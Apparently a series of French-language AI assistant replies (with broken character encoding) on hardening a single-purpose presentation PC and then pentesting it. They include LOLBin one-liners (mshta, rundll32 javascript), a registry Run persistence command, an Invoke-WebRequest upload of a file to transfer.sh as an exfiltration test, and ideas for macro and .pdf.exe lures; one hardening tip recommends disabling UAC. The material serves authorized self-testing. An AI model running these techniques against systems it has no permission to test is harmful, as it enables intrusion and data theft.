TrÃ¨s bon rÃ©flexe de vouloir Ã  la fois durcir et tester ce poste dÃ©diÃ© Ã  un usage trÃ¨s restreint (prÃ©sentation uniquement). Voici une rÃ©ponse en deux temps : (1) les mesures de durcissement maximales, puis (2) les pistes pour le pentest.

â¸»

ğŸ” 1. Suggestions de durcissement extrÃªme

Objectif : poste quasiment kiosquÃ©, ultra-limitÃ©, impossible Ã  dÃ©tourner.

âœ… SystÃ¨me dâ€™exploitation et configuration
	â€¢	Mode Kiosque / Assigned Access (sur Windows) : ne lancer quâ€™une seule app (ex: PowerPoint, ou PDF viewer).
	â€¢	Compte local avec droits minimum (aucun droit admin).
	â€¢	Suppression ou dÃ©sactivation de PowerShell, CMD, Regedit, WScript, cscript, etc.
	â€¢	DÃ©sactivation de lâ€™UAC, ou rÃ©glÃ©e Ã  son niveau le plus restrictif.
	â€¢	Applocker ou WDAC : pour bloquer tout exÃ©cutable non autorisÃ©.
	â€¢	BitLocker activÃ© si le disque contient des documents, mÃªme limitÃ©s.

ğŸ”’ RÃ©seau et pÃ©riphÃ©riques
	â€¢	Pas dâ€™accÃ¨s Internet (filtrage par pare-feu ou absence de passerelle).
	â€¢	DÃ©sactivation de toutes interfaces rÃ©seau non nÃ©cessaires (WiFi, Bluetooth, Ethernet si non utile).
	â€¢	DÃ©sactivation des ports USB : via BIOS/UEFI ou GPO.
	â€¢	Ou usage de USBGuard (sous Linux).
	â€¢	Ou USB en lecture seule uniquement (si besoin pour charger un PDF).
	â€¢	BIOS/UEFI protÃ©gÃ© par mot de passe, Secure Boot activÃ©.

ğŸ“¦ SystÃ¨me de fichiers et sÃ©curitÃ©
	â€¢	Suppression des outils inutiles / nettoyage du systÃ¨me.
	â€¢	Lecture seule sur les dossiers utilisateurs / AppData si possible.
	â€¢	Pas de stockage local : tout se lit depuis un rÃ©seau en lecture seule ou clÃ© USB validÃ©e.
	â€¢	DÃ©sactivation du presse-papiers partagÃ© (utile en virtualisation).
	â€¢	DÃ©sactivation de la mise Ã  jour automatique, ou contrÃ´le via WSUS.

ğŸ¯ Autres protections
	â€¢	Antivirus/EDR trÃ¨s restrictif.
	â€¢	Ã‰vÃ©nements journaux activÃ©s (audits de lancement de processus, accÃ¨s fichiers, USB, etc.).
	â€¢	Blocage de toutes les notifications, mises Ã  jour et pop-ups intempestives.
	â€¢	Verrouillage automatique par GPO aprÃ¨s X min, session fermÃ©e automatiquement.

â¸»

ğŸ§ª 2. Pentest / test dâ€™intrusion ciblÃ©

But : essayer de dÃ©tourner les restrictions, accÃ©der Ã  des outils interdits, ou Ã©lever les privilÃ¨ges.

ğŸ” Ã€ tester (manuellement ou via scripts dâ€™audit)

â–¶ï¸ ExÃ©cution dâ€™exÃ©cutables
	â€¢	Peut-on lancer .exe depuis une clÃ© USB ?
	â€¢	Peut-on contourner via : script .vbs, .ps1, .bat, .hta, .lnk ?
	â€¢	Peut-on renommer un .exe en .jpg puis le relancer ?

ğŸ§° Commandes systÃ¨mes / Shell
	â€¢	CMD, PowerShell, WSL, Regedit bloquÃ©s ?
	â€¢	Peut-on lancer des commandes via dâ€™autres outils (Word avec macro, fichiers .scf, Paint + OLE, etc.) ?

ğŸ”“ Ã‰lÃ©vation de privilÃ¨ges
	â€¢	Utilisateur standard peut-il faire des changements ?
	â€¢	UAC dÃ©sactivÃ© ou contournable ?
	â€¢	AccÃ¨s Ã  des outils comme runas, schtasks, taskmgr, etc. ?

ğŸ“¤ Exfiltration / transfert de fichiers
	â€¢	Peut-on lire un fichier confidentiel ?
	â€¢	Peut-on uploader un fichier sur Internet (ex : vers transfer.sh, imgur, etc.) ?
	â€¢	Peut-on envoyer un mail depuis le poste ? Via Outlook, ou autre ?

ğŸ§¿ Interface physique
	â€¢	Que se passe-t-il si on branche :
	â€¢	Une clÃ© USB (stockage, HID, Rubber Ducky, USB Killer) ?
	â€¢	Une carte rÃ©seau USB ?
	â€¢	Un smartphone en mode modem USB ?

ğŸ› Persistance
	â€¢	Peut-on crÃ©er un script de dÃ©marrage ?
	â€¢	Planifier une tÃ¢che ?
	â€¢	Ã‰crire dans les clefs de registre Run ou RunOnce ?

ğŸ–¼ï¸ Virtualisation / Forensic
	â€¢	Poste dans une VM ? Peut-on Ã©chapper au sandbox ?
	â€¢	Peut-on modifier la mÃ©moire, injecter du code dans un processus ?

â¸»

ğŸ Bonus : outils utiles pour le test
	â€¢	ğŸ› ï¸ Sysinternals Suite : Process Explorer, Autoruns, AccessChk, TCPView.
	â€¢	ğŸ” Seatbelt ou SharpUp : outils de post-exploitation pour vÃ©rifier la surface dâ€™attaque.
	â€¢	ğŸ§° PowerUp, WinPEAS, WinPrivChecker : pour tester les Ã©lÃ©vations de privilÃ¨ges.
	â€¢	ğŸ› Rubber Ducky / Bash Bunny (si tu as le matÃ©riel) pour tester lâ€™impact physique.
	â€¢	ğŸ“„ Word avec macro malveillante ou PDF piÃ©gÃ© pour test dâ€™ingÃ©nierie sociale.

â¸»

Souhaites-tu une checklist PDF ou tableau Excel pour suivre les tests / durcissements ?


Parfait, on passe en mode pentest local sur un poste durci. Voici des actions concrÃ¨tes, commandes, et ce quâ€™elles permettent de vÃ©rifier, organisÃ©es par objectif. Ce sont des tests rÃ©alistes que tu peux mener toi-mÃªme en local et sans outils offensifs avancÃ©s, parfait pour une Ã©valuation sur site.

â¸»

ğŸ§ª 1. ExÃ©cution bloquÃ©e ? Teste les contournements

â–¶ï¸ Basique

calc
notepad
cmd
powershell

âœ VÃ©rifie si tu peux exÃ©cuter un exÃ©cutable standard.

â–¶ï¸ Depuis un support amovible (clÃ© USB)
	â€¢	Copie un notepad.exe renommÃ© (ex: test.jpg) sur la clÃ©.
	â€¢	Lance-le depuis lâ€™explorateur.

â–¶ï¸ En script

echo Hello > test.bat
test.bat

Write-Output "Test OK"

âœ Si lâ€™exÃ©cution est bloquÃ©e par Applocker/WDAC, tu verras un message.

â¸»

ğŸ” 2. Contourner les restrictions via outils systÃ¨me

Teste les outils â€œdÃ©tournablesâ€

mshta vbscript:msgbox("Hello")

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Hello');

Word avec macro
	1.	CrÃ©e un .docm avec une macro :

Sub AutoOpen()
    MsgBox "Macro lancÃ©e"
End Sub

	2.	Ouvre le fichier sur le poste.

âœ VÃ©rifie si les macros sont bloquÃ©es.

â¸»

ğŸ§° 3. Environnement et droits utilisateur

Quel utilisateur suis-je ?

whoami

Suis-je admin ?

net localgroup administrators

Quels droits ai-je ?

whoami /priv

âœ Cherche SeDebugPrivilege, SeShutdownPrivilege, etc.

OÃ¹ suis-je ?

hostname
echo %USERNAME%
echo %USERDOMAIN%


â¸»

ğŸ”‘ 4. Peut-on faire de lâ€™Ã©lÃ©vation de privilÃ¨ge ?

Liste des tÃ¢ches planifiÃ©es

schtasks /query /fo LIST /v

âœ TÃ¢ches avec droits SYSTEM que tu peux modifier ?

Ouvre le Task Manager â†’ â€œOuvrir un nouveau processusâ€ (Ctrl+Shift+Esc)

âœ Peut-on lancer CMD en SYSTEM depuis lÃ  ?

â¸»

ğŸ“¤ 5. Test dâ€™exfiltration / communication rÃ©seau

Test Internet

ping google.com
curl https://example.com

Upload possible ?

Invoke-WebRequest -Uri "https://transfer.sh" -Method POST -InFile "test.txt"

âœ Sâ€™il y a un proxy ou pas de route, Ã§a Ã©chouera.

â¸»

ğŸ’¾ 6. USB et stockage
	1.	Branche une clÃ© USB avec un .exe, un .bat, un .vbs.
	2.	Essaie dâ€™exÃ©cuter les fichiers.
	3.	Tente de copier un fichier depuis le poste vers la clÃ©.

âœ VÃ©rifie si le port USB est bloquÃ© / lecture seule.

â¸»

ğŸ”’ 7. AccÃ¨s Ã  des outils systÃ¨me interdits

Teste depuis Win + R ou dans une invite :

regedit
taskmgr
eventvwr
services.msc
mmc

âœ Interdit par GPO ?

â¸»

ğŸ•µï¸ 8. Inspection de la sÃ©curitÃ© du systÃ¨me

Affiche les politiques en place

gpresult /h gp.html
start gp.html

VÃ©rifie les rÃ¨gles Applocker

Get-AppLockerPolicy -Effective -Xml

âœ Tu peux les analyser pour voir si certains chemins ou types de fichiers sont mal protÃ©gÃ©s.

â¸»

ğŸ§  9. Test â€œsocial engineeringâ€ local
	â€¢	Place un fichier rapport_paie_2024.xls avec macro malveillante.
	â€¢	Nom dâ€™un PDF : accÃ¨s_wifi_mission.pdf
	â€¢	Lance une fausse application (document.exe) renommÃ©e en .pdf

âœ Vois si un utilisateur peut Ãªtre incitÃ© Ã  lâ€™ouvrir malgrÃ© les protections.

â¸»

ğŸ§¿ 10. Persistence

Teste si tu peux :

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MonTest /t REG_SZ /d "notepad.exe"

âœ Si autorisÃ©, lâ€™exÃ©cution est trop permissive.

â¸»

Bonus : Si tu veux aller plus loin

Tu peux aussi :
	â€¢	Lancer WinPEAS (pas offensif, mais audit complet local)
	â€¢	Importer Seatbelt.exe pour un inventaire de sÃ©curitÃ©
	â€¢	Utiliser Autoruns (Sysinternals) pour voir les points de persistence actifs

â¸»

Souhaites-tu que je tâ€™en fasse un script de test automatisÃ© (batch ou PowerShell), ou une checklist papier Ã  remplir pendant le pentest ?

Parfait, on va sortir du simple diagnostic pour passer en mode vrai pentest local, mÃªme si tu es en environnement restreint. Voici ce que tu peux faire concrÃ¨tement, Ã©tape par Ã©tape, comme un pentesteur en boÃ®te noire (ou presque), avec des objectifs clairs, des techniques offensives adaptÃ©es Ã  un poste durci, et les rÃ©sultats attendus.

â¸»

ğŸ”ğŸ¯ Objectif global du pentest local

Montrer que tu peux contourner les restrictions du poste, accÃ©der Ã  des fonctions interdites, exfiltrer des donnÃ©es, ou persister sur la machine malgrÃ© les protections mises en place.

â¸»

ğŸ§­ Ã‰tapes concrÃ¨tes Ã  mener

â¸»

1. Reconnaissance locale

But : connaÃ®tre ton terrain avant de tenter quoi que ce soit.

ğŸ”¸ Ce que tu fais :
	â€¢	Ouvre un terminal (si autorisÃ©) ou passe par ExÃ©cuter (Win+R), Task Manager, Word, etc.
	â€¢	Collecte les infos de base : utilisateur, droits, services, applis installÃ©es, sÃ©curitÃ© active.

ğŸ”¸ Objectifs :
	â€¢	Savoir si tu es admin ou utilisateur restreint.
	â€¢	Savoir si des antivirus ou restrictions GPO sont en place.
	â€¢	RepÃ©rer les failles dans la conf (services exposÃ©s, ports ouverts, tÃ¢ches planifiÃ©esâ€¦)

â¸»

2. Test de contournement des restrictions

But : exÃ©cuter ce qui ne devrait pas pouvoir Ãªtre exÃ©cutÃ©.

ğŸ”¸ Ce que tu fais :
	â€¢	Apporte une clÃ© USB avec plusieurs payloads :
	â€¢	test.bat, macro.docm, test.exe, document.pdf.exe, mshta.vbs
	â€¢	Essaie de les lancer directement, ou en passant par :
	â€¢	Word (macro), Explorateur Windows (double-clic), Win+R, Task Manager â†’ â€œNouveau processusâ€

ğŸ”¸ Objectifs :
	â€¢	Savoir si le systÃ¨me bloque vraiment lâ€™exÃ©cution.
	â€¢	Tester les failles courantes (extension masquÃ©e .pdf.exe, HTA, scripts VBS, etc.)

â¸»

3. Test dâ€™Ã©lÃ©vation de privilÃ¨ges

But : tenter de devenir admin ou SYSTEM

ğŸ”¸ Ce que tu fais :
	â€¢	Liste les tÃ¢ches planifiÃ©es ou services modifiables
	â€¢	VÃ©rifie si tu peux Ã©crire dans certains dossiers systÃ¨mes
	â€¢	Lance des binaires dans des contextes Ã©levÃ©s (ex. notepad via une tÃ¢che SYSTEM mal configurÃ©e)

ğŸ”¸ Objectifs :
	â€¢	Trouver un binaire mal protÃ©gÃ©.
	â€¢	Exploiter une tÃ¢che ou un service pour injecter du code.

â¸»

4. Test de persistance

But : sâ€™assurer quâ€™une fois entrÃ©, tu peux rester

ğŸ”¸ Ce que tu fais :
	â€¢	Essaie de te faire relancer Ã  chaque dÃ©marrage :
	â€¢	ClÃ© de registre HKCU\Run
	â€¢	Script de logon (sâ€™il existe)
	â€¢	TÃ¢che planifiÃ©e en tant que toi-mÃªme

ğŸ”¸ Objectifs :
	â€¢	DÃ©montrer que la session utilisateur peut Ãªtre utilisÃ©e comme point dâ€™ancrage.
	â€¢	Voir si les fichiers que tu dÃ©poses persistent aprÃ¨s redÃ©marrage.

â¸»

5. Test dâ€™exfiltration de donnÃ©es

But : prouver que tu peux sortir des infos du poste

ğŸ”¸ Ce que tu fais :
	â€¢	Essaie de :
	â€¢	Uploader un fichier via curl ou Invoke-WebRequest
	â€¢	Envoyer un mail via un script PowerShell
	â€¢	Lire un fichier local et le copier sur ta clÃ© USB

ğŸ”¸ Objectifs :
	â€¢	Savoir si les restrictions rÃ©seau ou USB sont efficaces
	â€¢	Prouver la faille en rÃ©cupÃ©rant un fichier â€œconfidentielâ€ sur ta machine externe

â¸»

6. Test dâ€™injection ou dâ€™abus dâ€™application

But : utiliser une appli autorisÃ©e comme vecteur dâ€™attaque

ğŸ”¸ Ce que tu fais :
	â€¢	Ouvre PowerPoint ou PDF Reader
	â€¢	InsÃ¨re un lien vers une URL malveillante (ms-msdt:/, file://, etc.)
	â€¢	Lance un fichier OLE piÃ©gÃ© depuis Word (ex: Excel embedded)

ğŸ”¸ Objectifs :
	â€¢	Prouver que mÃªme un usage â€œautorisÃ©â€ peut Ãªtre dÃ©tournÃ©
	â€¢	Tester les protections contre lâ€™ingÃ©nierie sociale et les liens internes

â¸»

7. Test dâ€™attaque physique

But : tester ce qui se passe si un agent malveillant est physiquement devant le poste

ğŸ”¸ Ce que tu fais :
	â€¢	Branche :
	â€¢	Une clÃ© USB type Rubber Ducky (script HID : tape une sÃ©quence)
	â€¢	Un USB Ethernet (permet dâ€™injecter une nouvelle interface)
	â€¢	Un smartphone en mode modem USB
	â€¢	Observe le comportement du systÃ¨me :
	â€¢	Nouvelle interface rÃ©seau crÃ©Ã©e ?
	â€¢	Lancement automatique de fichiers ?

ğŸ”¸ Objectifs :
	â€¢	Prouver quâ€™un port USB non dÃ©sactivÃ© est une faille majeure.
	â€¢	Tester lâ€™impact dâ€™un â€œattaquant interne discretâ€.

â¸»

8. Bypass par app autorisÃ©e

But : utiliser une app autorisÃ©e pour faire des choses interdites

ğŸ”¸ Ce que tu fais :
	â€¢	Depuis PowerPoint â†’ lien vers cmd.exe
	â€¢	Depuis Excel â†’ Macro qui lance un script
	â€¢	Depuis Word â†’ insÃ¨re un ActiveX

ğŸ”¸ Objectifs :
	â€¢	Prouver quâ€™aucune app nâ€™est 100% safe si elle exÃ©cute du code.

â¸»

âœ… Ã€ la fin, documente :
	â€¢	Les failles dÃ©couvertes
	â€¢	Les moyens concrets de les exploiter
	â€¢	Les recommandations de remÃ©diation

â¸»

Souhaites-tu maintenant :
	â€¢	Un rapport de pentest type (squelette en .docx ou Markdown) ?
	â€¢	Un script dâ€™attaque locale automatisÃ©e (genre audit.bat) ?
	â€¢	Ou un jeu de fichiers USB (payloads) pour tester les exÃ©cutions ?